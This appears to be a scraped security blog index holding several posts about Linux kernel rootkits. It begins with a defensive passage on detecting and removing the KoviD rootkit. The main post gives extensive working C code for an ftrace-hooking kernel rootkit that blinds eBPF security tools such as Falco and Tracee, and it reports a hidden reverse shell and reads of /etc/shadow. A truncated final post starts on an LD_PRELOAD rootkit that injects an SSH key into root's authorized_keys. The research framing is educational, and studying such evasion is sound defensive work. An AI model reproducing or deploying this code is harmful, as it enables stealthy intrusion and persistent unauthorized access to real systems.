dmesg that a random magic word was generated, and this magic word is used to make KoviD visible again.\nIn kovid.c we can see this magic word function being called to make the module visible again.\nDetecting KoviD Well, luckily for us, there is a filesystem that is not very well known, which is tracing, normally on more up-to-date systems, it is already mounted by default, if tracefs is not mounted, just mount it using mount -t tracefs nodev /sys/kernel/tracing, and you can find its documentation at kernel.org.\nAnd in it we can simply view all the LKM functions that are loaded on the machine.\nA very interesting curiosity is that when Kovid is invisible, the trace only shows the addresses of each Kovid function (which in my head still doesn\u0026rsquo;t make much sense, since the /sys/kernel/tracing/available_filter_functions_addrs file was only added in kernel 6.5x, in it we can view the addresses of each function of each loaded lkm too and I am using kernel 5.15.0-119-generic for testing).\nNow, if we make kovid visible again, the name of its functions will appear.\nThis is a very simple way to detect KoviD, and it doesn\u0026rsquo;t require much effort.\nHowever, there is still a way to hide any function/LKM from the tracefs file system, so don\u0026rsquo;t be fooled by that and don\u0026rsquo;t think that if you didn\u0026rsquo;t find anything there that you are safe. Maybe I\u0026rsquo;ll talk about this in a future post.\nYou can also use nitara2 to detect KoviD.\nMaking KoviD hooks useless This part is very interesting and you will learn a really cool trick (if you didn\u0026rsquo;t already know).\nRemember when I mentioned at the beginning of the post that KoviD uses ftrace as a hooking method? So, many people may not know that there is a way to disable ftrace with just one command.\necho 0 \u0026gt; /proc/sys/kernel/ftrace_enabled or sysctl kernel.ftrace_enabled=0 Okay, but what\u0026rsquo;s so great about that? Well, let\u0026rsquo;s go!\nBy temporarily disabling ftrace, all kovid hooks stop working, as it uses ftrace for hooking, but this still does not make kovid visible, but it makes it useless.\nKoviD hides the file containing the name mtz, so /proc/mtz is hidden, and in it is the magic word to make LKM visible again.\nWell now with ftrace disabled we can see that the hidden /proc/mtz has become visible as no kovid hook works as it uses ftrace as syscalls hook.\nSo, after disabling ftrace, just go to /proc/mtz that was visible, get the magic word, and make LKM visible again, being able to remove it.\nAnd this is the easiest way to detect/remove KoviD.\nNotes 1- Of course, this is not 100% effective, as it has a way of hiding from the tracefs filesystem, but against KoviD so far, this works perfectly.\n2- And it is also obvious that in a real scenario, if someone is using KoviD, the name in /proc/name will not be something common like mtz, they would probably use a name that is less \u0026ldquo;imperceptible\u0026rdquo;.\n3- You can make any LKM rootkit that uses ftrace as hooking completely useless, and when you make it useless, you can use that to your advantage and analyze the compromised environment, looking for hidden PIDs, directories/files, etc.\nFinal consideration I hope you enjoyed this post and learned something, if you have any questions, please DM me on Twitter.\n","permalink":"http://localhost:1313/hacking/a-simple-way-to-detect-and-remove-kovid-lkm-rootkit/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/Xd3Y153.jpeg\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eHello everyone, welcome to this post where I will cover the easiest way on how to detect and remove LKM KoviD rootkit.\u003c/p\u003e\n\u003cp\u003eBut first of all, we need to understand how the KoviD works.\u003c/p\u003e\n\u003ch2 id=\"what-is-kovid\"\u003eWhat is KoviD?\u003c/h2\u003e\n\u003cp\u003eKoviD is a Linux kernel rootkit, containing several features that make it difficult to detect and remove, in my opinion KoviD is the best open source LKM rootkit today, you can see more about it on \u003ca href=\"https://github.com/carloslack/KoviD\"\u003egithub\u003c/a\u003e.\u003c/p\u003e","title":"A simple way to detect and remove LKM rootkit KoviD (Outdated)"},{"content":"Stealthy Kernel Rootkit: https://github.com/MatheuZSecurity/Singularity\nRootkit Researchers: https://discord.gg/66N5ZQppU7\nMe: https://www.linkedin.com/in/mathsalves/\nIntroduction Linux security tooling has leaned heavily into eBPF. Projects like Falco, Tracee, and Tetragon made kernel-level telemetry feel like a step change: richer context, low overhead, and visibility that’s difficult to evade from user space.\nBut that promise quietly depends on a threat model: the kernel is assumed to be a trustworthy observer.\nThis article explores what happens when that assumption breaks, specifically, when an attacker can execute code in the kernel (e.g., via a loaded module). In that world, the most valuable targets aren’t the eBPF programs themselves, but the plumbing around them: iterators, event delivery paths (ring buffer / perf buffer), perf submission, and map operations that turn kernel activity into user-space signals.\nAll research is strictly for educational purposes.\nTable of Contents Introduction The eBPF Security Landscape How eBPF Security Works The False Promise of Kernel Observability Understanding the Attack Surface BPF Iterators BPF Ringbuffers Perf Events BPF Maps Bypassing eBPF Security: Technical Implementation Hook Architecture Process and Network Hiding Intercepting BPF Iterators Filtering Ringbuffer Events Blocking Perf Event Submission Manipulating BPF Maps Real-World Bypass Results Falco Evasion Tracee Evasion Additional Tools Conclusion The eBPF Security Landscape How eBPF Security Works eBPF (extended Berkeley Packet Filter) has revolutionized Linux observability and security. Modern security tools leverage eBPF to monitor kernel events in real-time without modifying kernel code or loading traditional kernel modules.\nKey Components:\neBPF Programs: Sandboxed code running in kernel context, attached to various kernel events (syscalls, tracepoints, kprobes) BPF Maps: Kernel data structures for sharing information between eBPF programs and userspace Ringbuffers/Perf Events: Efficient mechanisms for streaming event data from kernel to userspace BPF Iterators: New mechanism for efficiently iterating over kernel objects (processes, network connections, etc.) Security Tools Using eBPF:\nFalco: Runtime security monitoring, detects anomalous behavior Tracee: System call and event tracing for security analysis Tetragon: Policy enforcement and security observability Cilium: Network security and observability GhostScan: Rootkit detection via memory scanning Decloaker: Hidden process detection The False Promise of Kernel Observability The security community believed eBPF solved a fundamental problem: how do you monitor a system that an attacker controls? The answer seemed obvious: use kernel-level observability that attackers cannot evade.\nThis assumption contains a critical flaw.\nThe Fundamental Problem:\neBPF programs execute inside the kernel they are trying to observe, while the detection pipeline depends on kernel → userspace delivery (ring buffers/perf buffers/iterators) and userspace policy engines. If an attacker gains the ability to load a kernel module (via root access and disabled Secure Boot / unenforced module signing), they can modify the kernel\u0026rsquo;s behavior and selectively disrupt what those eBPF programs and collectors are able to see.\nWhy This Matters:\neBPF programs cannot protect themselves from kernel-level manipulation eBPF verifier only ensures memory safety, not security guarantees All eBPF data flow mechanisms (iterators, ringbuffers, maps) are implemented as kernel functions Kernel functions can be hooked via ftrace The moment an attacker has kernel-level access, observability becomes optional.\nUnderstanding the Attack Surface Before we can bypass eBPF security, we need to understand how these tools collect data. Let\u0026rsquo;s examine each mechanism.\nBPF Iterators BPF iterators allow eBPF programs to efficiently walk kernel data structures. Security tools use iterators to enumerate processes, network connections, and other kernel objects.\nIterator Flow:\nKernel Data (tasks, sockets) -\u0026gt; bpf_iter_run_prog() -\u0026gt; eBPF iterator program -\u0026gt; bpf_seq_write() / bpf_seq_printf() -\u0026gt; Userspace reads via seq_file Key Functions:\nbpf_iter_run_prog(): Executes the eBPF iterator program for each kernel object bpf_seq_write(): Writes data to the seq_file buffer bpf_seq_printf(): Formatted output to seq_file buffer Security Tools Using Iterators:\nGhostScan uses task iterators to detect hidden processes Decloaker uses network iterators to find hidden connections Custom security tools use iterators for forensic analysis BPF Ringbuffers Ringbuffers are the modern replacement for perf buffers, providing efficient event streaming from kernel to userspace with better performance and ordering guarantees.\nRingbuffer Flow:\nKernel Event -\u0026gt; eBPF program -\u0026gt; bpf_ringbuf_reserve() -\u0026gt; bpf_ringbuf_submit() or bpf_ringbuf_output() -\u0026gt; Userspace reads events Key Functions:\nbpf_ringbuf_reserve(): Allocates space in the ringbuffer bpf_ringbuf_submit(): Commits reserved data to the ringbuffer bpf_ringbuf_output(): One-shot write to ringbuffer Security Tools Using Event Delivery Mechanisms:\nFalco (modern eBPF probe): Uses BPF ring buffer (BPF_MAP_TYPE_RINGBUF) for kernel→userspace event delivery (driver/config dependent). Tracee: Uses perfbuffer/perf ring buffers as its primary kernel→userspace event delivery mechanism (and can vary by version/implementation). Tetragon: Uses kernel→userspace buffering mechanisms (e.g., ring buffer / perf-based buffers) depending on the component and version. Note: \u0026ldquo;Perf event arrays\u0026rdquo; and \u0026ldquo;BPF ring buffers\u0026rdquo; are different mechanisms - the former is per-CPU and older, while the latter is shared across CPUs and more efficient.\nPerf Events Perf events are the traditional mechanism for streaming kernel data to userspace. While older than ringbuffers, many tools still use them.\nPerf Event Flow:\nKernel Event -\u0026gt; eBPF program -\u0026gt; perf_event_output() -\u0026gt; perf_trace_run_bpf_submit() -\u0026gt; Userspace reads perf buffer Key Functions:\nperf_event_output(): Writes event to perf buffer perf_trace_run_bpf_submit(): Submits tracepoint data to eBPF programs Security Tools Using Perf Events:\nLegacy Falco versions Custom monitoring tools Kernel tracing utilities BPF Maps BPF maps are kernel data structures that store state and allow communication between eBPF programs and userspace.\nMap Operations:\neBPF program or userspace -\u0026gt; bpf_map_lookup_elem() -\u0026gt; bpf_map_update_elem() -\u0026gt; bpf_map_delete_elem() -\u0026gt; Kernel map data structure Key Functions:\nbpf_map_lookup_elem(): Retrieve value from map bpf_map_update_elem(): Insert or update map entry bpf_map_delete_elem(): Remove map entry Security Use Cases:\nStoring process metadata Tracking network connections Maintaining allow/deny lists Sharing data between eBPF programs Bypassing eBPF Security: Technical Implementation Now that we understand how eBPF security works, let\u0026rsquo;s examine how to systematically blind it.\nHook Architecture Our approach uses ftrace to hook critical BPF functions. Ftrace allows dynamic tracing of kernel functions without modifying kernel code, making it perfect for interception.\nHooked Functions:\nstatic struct ftrace_hook hooks[] = { // BPF Iterator Hooks HOOK(\u0026#34;bpf_iter_run_prog\u0026#34;, hook_bpf_iter_run_prog, \u0026amp;orig_bpf_iter_run_prog), HOOK(\u0026#34;bpf_seq_write\u0026#34;, hook_bpf_seq_write, \u0026amp;orig_bpf_seq_write), HOOK(\u0026#34;bpf_seq_printf\u0026#34;, hook_bpf_seq_printf, \u0026amp;orig_bpf_seq_printf), // BPF Ringbuffer Hooks HOOK(\u0026#34;bpf_ringbuf_output\u0026#34;, hook_bpf_ringbuf_output, \u0026amp;orig_bpf_ringbuf_output), HOOK(\u0026#34;bpf_ringbuf_reserve\u0026#34;, hook_bpf_ringbuf_reserve, \u0026amp;orig_bpf_ringbuf_reserve), HOOK(\u0026#34;bpf_ringbuf_submit\u0026#34;, hook_bpf_ringbuf_submit, \u0026amp;orig_bpf_ringbuf_submit), // BPF Map Hooks HOOK(\u0026#34;bpf_map_lookup_elem\u0026#34;, hook_bpf_map_lookup_elem, \u0026amp;orig_bpf_map_lookup_elem), HOOK(\u0026#34;bpf_map_update_elem\u0026#34;, hook_bpf_map_update_elem, \u0026amp;orig_bpf_map_update_elem), // Perf Event Hooks HOOK(\u0026#34;perf_event_output\u0026#34;, hook_perf_event_output, \u0026amp;orig_perf_event_output), HOOK(\u0026#34;perf_trace_run_bpf_submit\u0026#34;, hook_perf_trace_run_bpf_submit, \u0026amp;orig_perf_trace_run_bpf_submit), // BPF Program Execution HOOK(\u0026#34;__bpf_prog_run\u0026#34;, hook_bpf_prog_run, \u0026amp;orig_bpf_prog_run), // BPF Syscall HOOK(\u0026#34;__x64_sys_bpf\u0026#34;, hook_bpf, \u0026amp;orig_bpf), HOOK(\u0026#34;__ia32_sys_bpf\u0026#34;, hook_bpf_ia32, \u0026amp;orig_bpf_ia32), }; Why This Works:\nKernel-level access: Once loaded, the rootkit runs at ring 0 with full privileges Ftrace hooking: Operates below eBPF programs, allowing us to filter their data sources No eBPF involvement: We\u0026rsquo;re not fighting eBPF, we\u0026rsquo;re cutting off its inputs Selective filtering: Only hide specific processes/connections, not everything Process and Network Hiding The rootkit maintains lists of hidden PIDs and network connections. Child process tracking ensures that when you hide a shell, all spawned processes also remain hidden.\nHidden PID Management:\n#define MAX_HIDDEN_PIDS 32 #define MAX_CHILD_PIDS (MAX_HIDDEN_PIDS * 128) extern int hidden_pids[MAX_HIDDEN_PIDS]; extern int hidden_count; extern int child_pids[MAX_CHILD_PIDS]; extern int child_count; notrace void add_hidden_pid(int pid) { int i; for (i = 0; i \u0026lt; hidden_count; i++) { if (hidden_pids[i] == pid) return; } if (hidden_count \u0026lt; MAX_HIDDEN_PIDS) { hidden_pids[hidden_count++] = pid; } } notrace int is_hidden_pid(int pid) { int i; for (i = 0; i \u0026lt; hidden_count; i++) { if (hidden_pids[i] == pid) return 1; } return 0; } Child Process Tracking:\nstatic notrace bool is_child_of_hidden_process(int pid) { struct task_struct *task; struct task_struct *parent; int depth = 0; int max_depth = 10; bool hidden = false; if (pid \u0026lt;= 0) return false; if (should_hide_pid_by_int(pid)) return true; rcu_read_lock(); task = pid_task(find_vpid(pid), PIDTYPE_PID); if (!task) { rcu_read_unlock(); return false; } parent = task; while (parent \u0026amp;\u0026amp; depth \u0026lt; max_depth) { if (parent-\u0026gt;pid \u0026lt;= 0) break; parent = rcu_dereference(parent-\u0026gt;real_parent); if (!parent || parent-\u0026gt;pid \u0026lt;= 1) break; if (should_hide_pid_by_int(parent-\u0026gt;pid)) { hidden = true; break; } depth++; } rcu_read_unlock(); return hidden; } Network Connection Hiding:\n#define HIDDEN_PORT 8081 static notrace bool should_hide_socket_port(struct sock_common *sk) { __be16 sport, dport; __be32 saddr, daddr; if (!sk) return false; init_hidden_ip(); if (sk-\u0026gt;skc_family == AF_INET) { sport = sk-\u0026gt;skc_num; dport = sk-\u0026gt;skc_dport; saddr = sk-\u0026gt;skc_rcv_saddr; daddr = sk-\u0026gt;skc_daddr; if (sport == HIDDEN_PORT || ntohs(dport) == HIDDEN_PORT) { if (saddr == hidden_ip_cached || daddr == hidden_ip_cached || saddr == htonl(INADDR_ANY) || daddr == htonl(INADDR_ANY)) { return true; } } } else if (sk-\u0026gt;skc_family == AF_INET6) { sport = sk-\u0026gt;skc_num; if (sport == HIDDEN_PORT) { return true; } } return false; } Intercepting BPF Iterators BPF iterators allow tools like GhostScan and Decloaker to enumerate kernel objects. By hooking the iterator execution, we can selectively filter results.\nIterator Context Structures:\nstruct bpf_iter_ctx_tcp { struct bpf_iter_meta *meta; struct sock_common *sk_common; uid_t uid; }; struct bpf_iter_ctx_udp { struct bpf_iter_meta *meta; struct udp_sock *udp_sk; uid_t uid; int bucket; }; struct bpf_iter_ctx_task { struct bpf_iter_meta *meta; struct task_struct *task; }; Hooking bpf_iter_run_prog:\nstatic notrace int hook_bpf_iter_run_prog(struct bpf_prog *prog, void *ctx) { struct bpf_iter_ctx_tcp *tcp_ctx; struct bpf_iter_ctx_udp *udp_ctx; struct bpf_iter_ctx_task *task_ctx; struct sock_common *sk; struct udp_sock *udp_sk; struct task_struct *task; if (!orig_bpf_iter_run_prog || !ctx) goto passthrough; // Check if this is a TCP socket iterator tcp_ctx = (struct bpf_iter_ctx_tcp *)ctx; if (tcp_ctx \u0026amp;\u0026amp; tcp_ctx-\u0026gt;sk_common) { sk = tcp_ctx-\u0026gt;sk_common; if ((unsigned long)sk \u0026gt; PAGE_SIZE) { if (should_hide_socket_port(sk)) { return 0; // Skip this socket } } } // Check if this is a UDP socket iterator udp_ctx = (struct bpf_iter_ctx_udp *)ctx; if (udp_ctx \u0026amp;\u0026amp; udp_ctx-\u0026gt;udp_sk) { udp_sk = udp_ctx-\u0026gt;udp_sk; if ((unsigned long)udp_sk \u0026gt; PAGE_SIZE) { sk = \u0026amp;udp_sk-\u0026gt;inet.sk.__sk_common; if (should_hide_socket_port(sk)) { return 0; // Skip this socket } } } // Check if this is a task iterator task_ctx = (struct bpf_iter_ctx_task *)ctx; if (task_ctx \u0026amp;\u0026amp; task_ctx-\u0026gt;task) { task = task_ctx-\u0026gt;task; if ((unsigned long)task \u0026gt; PAGE_SIZE \u0026amp;\u0026amp; task-\u0026gt;pid \u0026gt; 0) { if (is_child_of_hidden_process(task-\u0026gt;pid)) { return 0; // Skip this task } } } passthrough: return orig_bpf_iter_run_prog(prog, ctx); } How This Defeats Detection:\nWhen GhostScan or Decloaker use BPF iterators to enumerate processes or network connections, our hook intercepts each iteration. For hidden PIDs or network connections, we return 0 (skip), preventing the eBPF program from ever seeing that object. The security tool thinks it\u0026rsquo;s seeing the complete system state, but we\u0026rsquo;ve selectively filtered the view.\nHooking seq_file Output:\nIterators also use bpf_seq_write() and bpf_seq_printf() to format output. We hook these too:\nstatic notrace int hook_bpf_seq_write(struct seq_file *seq, const void *data, u32 len) { const u32 *pid_data; int i; if (!orig_bpf_seq_write) return -ENOSYS; if (!data || len \u0026lt; sizeof(u32)) goto passthrough; // Scan the data for PIDs pid_data = (const u32 *)data; for (i = 0; i \u0026lt; (len / sizeof(u32)) \u0026amp;\u0026amp; i \u0026lt; 16; i++) { u32 potential_pid = pid_data[i]; if (potential_pid \u0026gt; 0 \u0026amp;\u0026amp; potential_pid \u0026lt; 4194304) { if (is_child_of_hidden_process((int)potential_pid)) { return 0; // Block this write } } } passthrough: return orig_bpf_seq_write(seq, data, len); } Filtering Ringbuffer Events Falco and Tracee heavily rely on ringbuffers for event streaming. By hooking ringbuffer operations, we can prevent events related to our processes from reaching userspace.\nFalco Event Structure:\nstruct falco_event_hdr { u64 ts; u64 tid; u32 len; u16 type; u32 nparams; } __attribute__((packed)); static notrace bool is_falco_event(void *data, u64 size) { struct falco_event_hdr *hdr; if (!data || size \u0026lt; sizeof(struct falco_event_hdr)) return false; hdr = (struct falco_event_hdr *)data; // Validate event structure if (hdr-\u0026gt;type \u0026gt;= 1 \u0026amp;\u0026amp; hdr-\u0026gt;type \u0026lt;= 400 \u0026amp;\u0026amp; hdr-\u0026gt;len \u0026gt; 0 \u0026amp;\u0026amp; hdr-\u0026gt;len \u0026lt; 65536 \u0026amp;\u0026amp; hdr-\u0026gt;nparams \u0026lt; 20) { return true; } return false; } Hooking bpf_ringbuf_output:\nstatic notrace long hook_bpf_ringbuf_output(void *ringbuf, void *data, u64 size, u64 flags) { struct falco_event_hdr *hdr; int pid; if (!orig_bpf_ringbuf_output) return -ENOSYS; if (!data || !ringbuf) goto passthrough; // Check if this looks like a Falco event if (!is_falco_event(data, size)) goto passthrough; hdr = (struct falco_event_hdr *)data; pid = (int)(hdr-\u0026gt;tid \u0026amp; 0xFFFFFFFF); // If this event is from a hidden process, drop it if (is_child_of_hidden_process(pid)) { return 0; } passthrough: return orig_bpf_ringbuf_output(ringbuf, data, size, flags); } Hooking bpf_ringbuf_reserve:\nstatic notrace void *hook_bpf_ringbuf_reserve(void *ringbuf, u64 size, u64 flags) { pid_t pid; if (!orig_bpf_ringbuf_reserve) return NULL; pid = current-\u0026gt;tgid; // Deny ringbuffer allocation for hidden processes if (is_child_of_hidden_process(pid)) { return NULL; } return orig_bpf_ringbuf_reserve(ringbuf, size, flags); } Hooking bpf_ringbuf_submit:\nstatic notrace void hook_bpf_ringbuf_submit(void *data, u64 flags) { struct falco_event_hdr *hdr; int pid; if (!orig_bpf_ringbuf_submit) return; if (!data) goto passthrough; if (!is_falco_event(data, 0)) goto passthrough; hdr = (struct falco_event_hdr *)data; pid = (int)(hdr-\u0026gt;tid \u0026amp; 0xFFFFFFFF); // Drop submission for hidden processes if (is_child_of_hidden_process(pid)) { return; } passthrough: orig_bpf_ringbuf_submit(data, flags); } How This Defeats Detection:\nFalco and Tracee see syscall events, process creation, file access, and network activity through ringbuffers. By intercepting at three points (reserve, output, submit), we ensure that events from hidden processes never make it to the ringbuffer. From Falco\u0026rsquo;s perspective, these processes simply don\u0026rsquo;t exist.\nBlocking Perf Event Submission Older tools and some Falco configurations still use perf events instead of ringbuffers. We hook these too.\nHooking perf_event_output:\nstatic notrace int hook_perf_event_output(struct perf_event *event, struct perf_sample_data *data, struct pt_regs *regs) { pid_t pid; if (!orig_perf_event_output) return -ENOSYS; pid = current-\u0026gt;tgid; // Drop perf events for hidden processes if (is_child_of_hidden_process(pid)) { return 0; } return orig_perf_event_output(event, data, regs); } Hooking perf_trace_run_bpf_submit:\nstatic notrace void hook_perf_trace_run_bpf_submit(void *raw_data, int size, int rctx, struct pt_regs *regs, struct hlist_head *head, struct task_struct *task) { if (!orig_perf_trace_run_bpf_submit) return; // Check if the task is hidden if (task \u0026amp;\u0026amp; is_child_of_hidden_process(task-\u0026gt;pid)) { return; } // Also check current process if (is_child_of_hidden_process(current-\u0026gt;tgid)) { return; } orig_perf_trace_run_bpf_submit(raw_data, size, rctx, regs, head, task); } Manipulating BPF Maps Security tools often use BPF maps to store process metadata, track suspicious activity, or maintain state. By hooking map operations, we can prevent our processes from being recorded.\nHooking bpf_map_lookup_elem:\nstatic notrace void *hook_bpf_map_lookup_elem(struct bpf_map *map, const void *key) { void *ret; pid_t pid; if (!orig_bpf_map_lookup_elem) return NULL; ret = orig_bpf_map_lookup_elem(map, key); // If the map uses PIDs as keys, filter hidden PIDs if (ret \u0026amp;\u0026amp; map \u0026amp;\u0026amp; map-\u0026gt;key_size == sizeof(pid_t)) { pid = *(pid_t *)key; if (is_child_of_hidden_process(pid)) { return NULL; // Pretend the entry doesn\u0026#39;t exist } } return ret; } Hooking bpf_map_update_elem:\nstatic notrace long hook_bpf_map_update_elem(struct bpf_map *map, void *key, void *value, u64 flags) { u32 *pid_key; if (!orig_bpf_map_update_elem) return -ENOSYS; // If this is a PID-keyed map, block updates for hidden PIDs if (map \u0026amp;\u0026amp; map-\u0026gt;key_size == sizeof(u32)) { pid_key = (u32 *)key; if (is_child_of_hidden_process((int)*pid_key)) { return 0; // Silently succeed without actually updating } } return orig_bpf_map_update_elem(map, key, value, flags); } How This Defeats Detection:\nSecurity tools that track process behavior using BPF maps will never see entries for our hidden processes. When they try to look up a hidden PID, the lookup returns NULL. When they try to store data about a hidden process, the update silently fails. The tool\u0026rsquo;s logic continues to work, but it operates on an incomplete view of reality.\nBlocking eBPF Program Execution For maximum stealth, we can also prevent eBPF programs from running when triggered by our hidden processes.\nHooking __bpf_prog_run:\nstatic notrace u32 hook_bpf_prog_run(const struct bpf_prog *prog, const void *ctx) { pid_t pid; if (!orig_bpf_prog_run) return 0; pid = current-\u0026gt;tgid; // Don\u0026#39;t execute eBPF programs for hidden processes if (is_child_of_hidden_process(pid)) { return 0; } return orig_bpf_prog_run(prog, ctx); } Hooking the bpf() syscall:\nstatic notrace asmlinkage long hook_bpf(const struct pt_regs *regs) { int cmd; pid_t pid; if (!orig_bpf) return -ENOSYS; cmd = (int)regs-\u0026gt;di; pid = current-\u0026gt;tgid; // Hidden processes can use bpf() normally // but we could log/block specific commands here if (is_child_of_hidden_process(pid)) { // Optional: block certain BPF commands } return orig_bpf(regs); } Real-World Bypass Results Proof-of-Concept video demonstrating these results:\nFalco Evasion Falco is one of the most popular eBPF-based runtime security tools. It monitors syscalls, file access, network connections, and process execution to detect threats.\nWhat Falco Should Detect:\nReverse shell creation Suspicious network connections Critical file read And common post-exploitation activity (process exec/spawn, outbound connections, and sensitive file access).\nBypass Results:\nWith our BPF hooks active:\nReverse Shell: Connected to attacker-controlled server on port 8081. Falco detected nothing. Process Execution: Spawned interactive bash shell. Falco detected nothing. File Modification: Modified and read /etc/passwd, /etc/shadow. Falco detected nothing. Network Activity: Established multiple TCP connections. Falco detected nothing. Privilege Escalation: Used rootkit\u0026rsquo;s signal-based privilege escalation (kill -59). Falco detected nothing. Why The Bypass Works:\nFalco\u0026rsquo;s eBPF programs successfully attach to syscall tracepoints and execute as designed. However, every event they generate passes through kernel→userspace delivery (ring buffer / perf buffer, depending on driver/version), which we can disrupt via hooked kernel functions. Events from hidden processes are filtered before reaching Falco\u0026rsquo;s userspace agent. From Falco\u0026rsquo;s perspective, the system appears normal.\nTracee Evasion Tracee provides detailed system call tracing and event analysis. It\u0026rsquo;s designed to detect anomalous behavior and hidden processes.\nWhat Tracee Should Detect:\nHidden processes Kernel module loading Syscall anomalies And common attacker workflows (process hiding and suspicious network behavior).\nBypass Results:\nWith our BPF hooks active:\nProcess Enumeration: Tracee\u0026rsquo;s process listing showed no hidden processes Syscall Tracing: No syscalls from hidden processes appeared in traces Network Connections: Hidden network connections invisible to Tracee Why The Bypass Works:\nTracee relies on BPF iterators for process enumeration and ringbuffers for syscall events. Our hooks intercept both. The iterator hook ensures hidden processes never appear in enumeration. The ringbuffer hooks prevent syscall events from being recorded.\nAdditional Tools GhostScan:\nGhostScan attempts to detect hidden processes by comparing different enumeration methods. It uses BPF iterators to walk the task list.\nResult: Hidden processes remain invisible. Our iterator hooks ensure consistency across all enumeration methods.\nDecloaker:\nDecloaker tries to reveal hidden network connections by using multiple detection techniques including BPF iterators.\nResult: Hidden connections remain invisible. Our iterator and socket filtering hooks ensure network connections on our target port never appear.\nCustom eBPF Tools:\nSeveral custom security tool using BPF iterators, ringbuffers, or perf events for monitoring will be equally blind to our hidden processes.\nThe Hard Truth:\nIf an attacker gains the ability to load kernel modules, they control the kernel\u0026rsquo;s view of reality. eBPF security tools run inside the kernel and thus cannot fully protect a compromised kernel. The only reliable defense is preventing kernel compromise in the first place.\nConclusion This research demonstrates that eBPF-based security tools, while powerful, operate under a false assumption: that kernel-level observability provides complete visibility. In reality, when an attacker achieves kernel-level access through a loaded module, they can systematically blind these tools by hooking the very mechanisms they rely on.\nKey Findings:\nTarget the data path, not the program: If you can control the kernel-side plumbing that carries events to user space, the eBPF program can \u0026ldquo;run correctly\u0026rdquo; while its output never arrives.\nEnumerators are just another surface: Iterator-based tools depend on bpf_iter_run_prog() and seq_file writes. Filtering there can make multiple views of the system agree on a lie.\nEvent delivery is a choke point: Whether a tool uses ring buffer (BPF_MAP_TYPE_RINGBUF) or perf buffer (BPF_MAP_TYPE_PERF_EVENT_ARRAY), the kernel→userspace boundary creates a natural interception point.\nState can be selectively erased: Map lookups/updates are convenient places to make hidden PIDs appear “not found” without breaking the rest of the system.\nOnce the kernel is hostile, observability is best-effort: eBPF improves visibility under a trusted kernel. It does not harden a compromised kernel.\nWhat this PoC demonstrates:\nSuccessfully bypassed Falco, Tracee, GhostScan, and Decloaker Demonstrated complete process and network hiding from eBPF tools Proved that kernel-level access fundamentally breaks the security model Showed that observability itself can be made optional for an attacker Defensive Implications:\nSecurity cannot rely solely on kernel-level observability. Defense-in-depth requires:\nPreventing kernel compromise through Secure Boot and signed modules Multi-layer monitoring including network-level detection Hardware-rooted trust and attestation Accepting that a compromised kernel cannot secure itself The Future:\nThis cat-and-mouse game will continue. Security vendors will develop new detection methods. Attackers will find new bypass techniques. The fundamental truth remains: the moment an attacker controls the kernel, they control reality as the system sees it.\nThe only winning move is not to let them get there.\nResearch Resources:\nSingularity Rootkit: https://github.com/MatheuZSecurity/Singularity Rootkit Research Community: https://discord.gg/66N5ZQppU7 Contact: X (@MatheuzSecurity) | Discord (kprobe) Responsible Disclosure:\nThis research has been conducted for educational purposes. All techniques described are intended to improve defensive capabilities by understanding attacker methodologies. The code is published to help security researchers develop better detection and prevention mechanisms.\nIf you\u0026rsquo;re a security vendor affected by these techniques, please reach out for collaboration on improved detection strategies.\n","permalink":"http://localhost:1313/hacking/ebpf-security-tools-hacking/","summary":"\u003cp\u003eStealthy Kernel Rootkit: \u003ca href=\"https://github.com/MatheuZSecurity/Singularity\"\u003ehttps://github.com/MatheuZSecurity/Singularity\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eRootkit Researchers: \u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eMe: \u003ca href=\"https://www.linkedin.com/in/mathsalves/\"\u003ehttps://www.linkedin.com/in/mathsalves/\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\u003cp\u003eLinux security tooling has leaned heavily into eBPF. Projects like Falco, Tracee, and Tetragon made kernel-level telemetry feel like a step change: richer context, low overhead, and visibility that’s difficult to evade from user space.\u003c/p\u003e\n\u003cp\u003eBut that promise quietly depends on a threat model: the kernel is assumed to be a trustworthy observer.\u003c/p\u003e\n\u003cp\u003eThis article explores what happens when that assumption breaks, specifically, when an attacker can execute code in the kernel (e.g., via a loaded module). In that world, the most valuable targets aren’t the eBPF programs themselves, but the plumbing around them: iterators, event delivery paths (ring buffer / perf buffer), perf submission, and map operations that turn kernel activity into user-space signals.\u003c/p\u003e","title":"Breaking eBPF Security: How Kernel Rootkits Blind Observability Tools"},{"content":" This article explores a technique to bypass Userland based hooks, such as those implemented via LD_PRELOAD by leveraging io_uring, a modern Linux kernel interface for asynchronous I/O. By bypassing traditional libc wrappers, such as open(), write(), and close(), which are commonly intercepted in LD_PRELOAD based hooks, it\u0026rsquo;s possible to evade detection or interference by such malicious userspace mechanisms.\nWe demonstrate this by comparing a simple LD_PRELOAD rootkit that hooks the open() call with a program that uses io_uring to interact with the file system while still leveraging syscalls internally, io_uring minimizes user‑kernel transitions by batching operations through shared memory queues, issuing only a few essential syscalls (e.g., io_uring_enter, io_uring_setup) for coordination.\nIntroduction to io_uring io_uring is a Linux kernel interface introduced by Jens Axboe in kernel 5.1 to provide high-performance asynchronous I/O operations. Traditional I/O operations in Linux involve costly system calls and context switches. io_uring allows applications to queue I/O requests in shared memory, significantly reducing the number of syscalls and context switches required for I/O, although not completely eliminating them. This results in lower overhead compared to traditional read/write patterns.\nKey Benefits of io_uring:\nLower syscall overhead Direct submission of I/O reduces the frequency and cost of context switches Kernel land execution reduces visibility to userland hooks This makes io_uring an attractive alternative not only for performance-critical applications but also for offensive tooling that seeks to avoid traditional monitoring vectors.\nRootkits via LD_PRELOAD A common technique used in userland rootkits is to hook libc functions like open(), read(), and write() using LD_PRELOAD. By intercepting these calls, the rootkit can hide files, inject backdoors, or modify behavior.\nExample: LD_PRELOAD Rootkit Explained This example demonstrates a userspace hook for the open() function to detect when a process tries to open /root/.ssh/authorized_keys, and instead injects an SSH key, enabling unauthorized access.\n// https://discord.gg/66N5ZQppU7 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;stdarg.h\u0026gt; typedef int (*open_func_type)(const char *, int, ...); static open_func_type orig_open = NULL; static int target(const char *pathname) 